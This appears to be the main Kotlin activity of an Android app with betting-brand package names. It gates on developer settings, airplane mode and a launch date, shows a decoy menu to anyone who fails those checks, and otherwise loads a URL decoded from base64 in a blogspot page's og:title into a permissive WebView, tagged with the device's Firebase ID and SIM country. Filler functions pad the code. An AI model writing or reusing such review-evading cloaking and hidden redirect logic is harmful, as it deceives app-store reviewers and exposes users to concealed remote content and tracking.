package app1.xstavka1.xbet1.xbet.pin.up.xbet1.x.stavka.bet;

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.*
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import app1.xstavka1.xbet1.xbet.pin.up.xbet1.x.stavka.bet.databinding.MainMainProjectBinding
import com.google.firebase.analytics.FirebaseAnalytics
import okhttp3.*
import java.io.IOException
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread


lateinit var Nfibet3webview: WebView
private var mismis : String = ""
private var numscountry : String = ""
private var id : String = ""


class main_main_project : AppCompatActivity() {
    lateinit var mFirebaseAnalytics: FirebaseAnalytics

    private val webclientnfibet3 = OkHttpClient()
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var nfibet3editor: SharedPreferences.Editor
    private val settings: String = "settings"
    lateinit var nfibet3main: MainMainProjectBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this)
        val bundle = Bundle()
        bundle.putString(FirebaseAnalytics.Param.ITEM_ID, id)
        bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, "name")
        bundle.putString(FirebaseAnalytics.Param.CONTENT_TYPE, "image")
        mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle)
        nfibet3main = MainMainProjectBinding.inflate(layoutInflater)
        setContentView(nfibet3main.root)
       id()


Log.d("FBID", numscountry)
        val getcont = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val cz = getcont.networkCountryIso
        mismis = cz

        val settingsDev = Settings.Secure.getInt(this.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0)

        val setDateNfibet3 = Date(123, 1, 28)
        val mydateNfibet3 = Date()
        val mydateFormatNfibet3: DateFormat = SimpleDateFormat("yyyy.MM.dd", Locale.getDefault())
        val dateTextNfibet3: String = mydateFormatNfibet3.format(mydateNfibet3)
        val dateText1Nfibet3: String = mydateFormatNfibet3.format(setDateNfibet3)
        val docDate1Nfibet3 = mydateFormatNfibet3.parse(dateText1Nfibet3)
        val docDateNfibet3 = mydateFormatNfibet3.parse(dateTextNfibet3)

        if (Settings.System.getInt(contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) == 0) {

            if (settingsDev == 0) {
                var bundle = Bundle()
                bundle.putString("card", "Mew Card")
var n = FirebaseAnalytics.getInstance(this).logEvent("sign_app", bundle)
Log.d("LogEvent", n.toString())
            if (docDateNfibet3 >= docDate1Nfibet3) {
                numfun1(numfun1 = 0)
                numfun2()
                numfun3()

                init()
                Log.d("keyShared", sharedPreferences.getString("Nfibet3Link", "пусто")!!)
                Log.d("keyShared", sharedPreferences.getInt("Nfibet3Number", 111).toString())

                // Если первый запуск, делаем запрос
                if (Nfibet3oneRun()) {
                    Log.d("keys", Nfibet3oneRun().toString())
                    Nfibet3getLink("https://lray5204.blogspot.com/2022/09/blog-post.html")
                } else {
                    Nfibet3openviewWebView()
                }
            } else {
                Log.d("Open1", "tyt")
                startActivity(
                    Intent(
                        this@main_main_project,
                        menu_main_project::class.java
                    )
                )
                finish()
            }
        }
            else{
                Log.d("Open2", "tyt")

                startActivity(
                    Intent(
                        this@main_main_project,
                        menu_main_project::class.java
                    )
                )
                finish()
            }
      }
        else{
            Log.d("Open3", "tyt")

            startActivity(
                Intent(
                    this@main_main_project,
                    menu_main_project::class.java
                )
            )
            finish()
        }
    }

    private fun id() {
        FirebaseAnalytics.getInstance(this).appInstanceId.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val uid = task.result
                id = uid
                Log.d("faerId1", id)
            }
        }

        Log.d("faerID", id)
    }

    private fun Nfibet3openviewWebView() {

        Handler(Looper.getMainLooper()).post(Runnable {
            val infoNfibet3 = sharedPreferences.getInt("Nfibet3Number", 111)
            val Nfibet3codeLink = sharedPreferences.getInt("Nfibet3code", 404)
            if (infoNfibet3.toString().length > 1) {
                nfibet3main.nfibet3progressBar.visibility = View.VISIBLE
                nfibet3main.nfibet3WebView.visibility = View.GONE
                nfibet3main.nfibet3txt.visibility = View.VISIBLE
                Log.d("keyOpenif2", infoNfibet3.toString())
            } else if (infoNfibet3 == 0) {
                startActivity(
                    Intent(
                        this@main_main_project,
                        menu_main_project::class.java
                    )
                )
                finish()
                Log.d("keyOpen2", "no")

            } else if (infoNfibet3 == 1) {
                Log.d("keyOpen3", "no")
                Nfibet3webview = nfibet3main.nfibet3WebView
                val Nfibet3url = sharedPreferences.getString("Nfibet3Link", "")
                val urlLinkeds2 = Uri.parse(Nfibet3url).buildUpon().appendQueryParameter("fbsup", id).appendQueryParameter("tlsim", mismis)
                Nfibet3webview.loadUrl(urlLinkeds2.toString()!!)
                Nfibet3webview.settings.domStorageEnabled = true
                Nfibet3webview.settings.javaScriptEnabled = true
                Nfibet3webview.settings.useWideViewPort = true
                Nfibet3webview.settings.loadWithOverviewMode = true
                Nfibet3webview.settings.allowFileAccess = true
                Nfibet3webview.settings.javaScriptCanOpenWindowsAutomatically = true
                Nfibet3webview.settings.setSupportMultipleWindows(false)
                Nfibet3webview.settings.displayZoomControls = false
                Nfibet3webview.settings.builtInZoomControls = true
                Nfibet3webview.settings.setSupportZoom(true)
                Nfibet3webview.settings.pluginState = WebSettings.PluginState.ON
                Nfibet3webview.settings.mixedContentMode = 0
                Nfibet3webview.settings.setAppCacheEnabled(true)
                Nfibet3webview.settings.allowContentAccess = true
                Nfibet3webview.webViewClient = object: WebViewClient(){
                    override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                        super.onPageStarted(view, url, favicon)
                    }
                    override fun onPageFinished(view: WebView, url: String) {

                        nfibet3main.nfibet3progressBar.visibility = View.GONE
                        nfibet3main.nfibet3txt.visibility = View.GONE
                        Nfibet3webview.visibility = View.VISIBLE

                    }

                }


            } else if (Nfibet3codeLink == 404) {
                startActivity(
                    Intent(
                        this@main_main_project,
                        menu_main_project::class.java
                    )
                )
                finish()
                Log.d("keyFail", "словил 404")

            }
        })

    }


    fun Nfibet3oneRun(): Boolean {
        Log.d("keyOpen", "open")
        return (sharedPreferences.getBoolean("firstrun", true) ?: true)
    }

    private fun Nfibet3getLink(Nfibet3urlLink: String) {
        val Nfibet3requestLink = Request.Builder()
            .url(Nfibet3urlLink)
            .build()
        webclientnfibet3.newCall(Nfibet3requestLink).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            @RequiresApi(Build.VERSION_CODES.O)
            override fun onResponse(call: Call, response: Response) {
                val Nfibet3Part = response.body?.string()
                val Nfibet3Num = Nfibet3Part?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(0)
                    ?.replace(" ", "")
                    ?.replace(" ", "")
                    ?.trim()

                val Nfibet3Link =  Nfibet3Part?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(1)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                val Nfibet3Link1 =  Nfibet3Part?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(2)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                Log.d("key2", Nfibet3Link1.toString())


                val Nfibet3decoderLinks = Base64.decode(Nfibet3Link, Base64.DEFAULT)
                val Nfibet3decoderStringLinks = String(Nfibet3decoderLinks)
                val Nfibet3decoder12 = Base64.decode(Nfibet3Link1, Base64.DEFAULT)
                val Nfibet3decoderString12 = String(Nfibet3decoder12)
                val Nfibet3urldecod = StringBuilder(Nfibet3decoderStringLinks).append(Nfibet3decoderString12).toString()
                Log.d("keyLinkeds", Nfibet3urldecod)
                Log.d("keyNumResponse", Nfibet3Num.toString())
                thread {
                    Thread.sleep(5000)
                    Handler(Looper.getMainLooper()).post(Runnable {

                        Log.d("key", "работает")
                        val Nfibet3info: Int = Nfibet3Num!!.toInt()
                        val Nfibet3codelink = response.code
                        when {
                            Nfibet3info.toString().length > 1 -> {
                                Log.d("keyIf1", Nfibet3info.toString())
                                startActivity(
                                    Intent(
                                        this@main_main_project,
                                        menu_main_project::class.java
                                    )
                                )
                                finish()
                                Log.d("keyOpenResponseNum1", "no")
                            }
                            Nfibet3info == 0 -> {
                                startActivity(
                                    Intent(
                                        this@main_main_project,
                                        menu_main_project::class.java
                                    )
                                )
                                finish()
                                Log.d("keyOpenResponseNum2", "no")

                            }
                            Nfibet3info == 1 -> {
                                Log.d("keyOpenResponseNum3", "no")
                                // loadurl(url = urldecod)

                                val urlencode = Nfibet3urldecod.toString()
                                val urlsL1 = Uri.parse(urlencode).buildUpon().appendQueryParameter("fbsup", id).appendQueryParameter("tlsim", mismis)

                                Nfibet3webview = nfibet3main.nfibet3WebView
                                Nfibet3webview.loadUrl(urlsL1.toString())
                                Nfibet3webview.settings.domStorageEnabled = true
                                Nfibet3webview.settings.javaScriptEnabled = true
                                Nfibet3webview.settings.useWideViewPort = true
                                Nfibet3webview.settings.loadWithOverviewMode = true
                                Nfibet3webview.settings.allowFileAccess = true
                                Nfibet3webview.settings.javaScriptCanOpenWindowsAutomatically = true
                                Nfibet3webview.settings.setSupportMultipleWindows(false)
                                Nfibet3webview.settings.displayZoomControls = false
                                Nfibet3webview.settings.builtInZoomControls = true
                                Nfibet3webview.settings.setSupportZoom(true)
                                Nfibet3webview.settings.pluginState = WebSettings.PluginState.ON
                                Nfibet3webview.settings.mixedContentMode = 0
                                Nfibet3webview.settings.setAppCacheEnabled(true)
                                Nfibet3webview.settings.allowContentAccess = true
                                Nfibet3webview.webViewClient = object: WebViewClient(){
                                    override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {


                                    }
                                    override fun onPageFinished(view: WebView, url: String) {

                                        nfibet3main.nfibet3progressBar.visibility = View.GONE
                                        nfibet3main.nfibet3txt.visibility = View.GONE
                                        Nfibet3webview.visibility = View.VISIBLE

                                    }
                                }

                            }
                            Nfibet3codelink == 404 -> {
                                startActivity(
                                    Intent(
                                        this@main_main_project,
                                        menu_main_project::class.java
                                    )
                                )
                                finish()
                            }
                        }

                    })
                }

                // Сохраняем результат запроса
                twoRunSaveLinks(Nfibet3codeerror = response.code)
                Nfibet3saveStringsLink(numbers = Nfibet3Num!!.toInt(), string = Nfibet3urldecod.toString())

                if (Nfibet3Part.contains("К сожалению, страница, которую вы искали в этом блоге, не существует")){}
            }
        })

    }


    private fun twoRunSaveLinks(Nfibet3codeerror: Int) {
        nfibet3editor.putInt("code", Nfibet3codeerror)
        nfibet3editor.apply()
    }

    fun Nfibet3saveStringsLink(numbers: Int, string: String) {

        nfibet3editor.putInt("Nfibet3Number", numbers)
        Log.d("keyNumShared", numbers.toString())
        nfibet3editor.putString("Nfibet3Link", string)
        Log.d("keyStr", string)
        nfibet3editor.putBoolean("firstrun", false)
        nfibet3editor.apply()
    }

    private fun init() {
        sharedPreferences = this.getSharedPreferences(settings, Context.MODE_PRIVATE)
        nfibet3editor = sharedPreferences.edit()
    }
    override fun onKeyDown(keyCodeNfibet3: Int, eventNfibet3: KeyEvent?): Boolean {
        if ((keyCodeNfibet3 == KeyEvent.KEYCODE_BACK) && nfibet3main.nfibet3WebView.canGoBack()) {
            nfibet3main.nfibet3WebView.goBack()
            return true
        }

        return super.onKeyDown(keyCodeNfibet3, eventNfibet3)
    }
    override fun onBackPressed() {
        super.onBackPressed()
        if (nfibet3main.nfibet3WebView.isFocused() && nfibet3main.nfibet3WebView.canGoBack()) {
            nfibet3main.nfibet3WebView.goBack()
        } else {
            super.onBackPressed()
        }
    }

}



private fun numfun3() {
    var numfun3 = (0..100).random()
    print( numfun3)
}

private fun numfun2() {
    var numfun1  = "приветгулигули"
    var numfun2 = "приветгулигули"
    var numfun3 = numfun1.length / numfun2.length
    print(numfun3.toDouble())
}

private fun numfun1(numfun1: Int) {
    var numfun1  = "приветгулигуливыфвыфвыфыфыфвыфыфввыфыфввыффывыыфвфы"
    var numfun2 = "приветгулигуливвфвыыфвввыфвыфвыфыф"
    val numfun3= numfun1.length * numfun2.length / 2
    print(numfun3)
}




